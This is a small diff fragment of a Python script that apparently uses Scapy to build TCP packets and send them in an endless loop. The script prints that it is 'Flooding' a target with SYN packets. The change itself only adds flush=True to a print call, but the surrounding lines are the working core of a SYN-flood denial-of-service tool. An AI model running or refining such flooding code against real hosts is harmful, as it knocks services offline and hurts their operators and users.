@@ -17,5 +17,5 @@ raw = Raw(b"X"*1024)
 # stack up the layers
 p = ip / tcp / raw
 # send the constructed packet in a loop until CTRL+C is detected 
-print(f"Flooding {target_ip} on port {target_port} with TCP SYN packets!")
+print(f"Flooding {target_ip} on port {target_port} with TCP SYN packets!", flush=True)
 send(p, loop=1, verbose=0)
